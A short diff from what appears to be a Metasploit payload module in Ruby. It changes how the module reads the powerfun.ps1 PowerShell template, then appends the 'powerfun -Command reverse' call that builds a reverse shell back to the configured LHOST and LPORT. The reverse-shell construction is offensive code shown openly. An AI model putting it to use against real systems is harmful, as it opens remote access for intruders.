@@ -54,13 +54,11 @@ module Metasploit3
     lport = datastore['LPORT']
     lhost = datastore['LHOST']
 
-    template_path = File.join(
-    Msf::Config.data_directory,
-    'exploits',
-    'powershell',
-    'powerfun.ps1')
-
-    script_in = File.read(template_path)
+    template_path = ::File.join( Msf::Config.data_directory, 'exploits', 'powershell','powerfun.ps1')
+    script_in = ""
+    ::File.open(template_path, "rb") do |fd|
+      script_in << fd.read(fd.stat.size)
+    end
     script_in << "\npowerfun -Command reverse"
 
     mods = ''
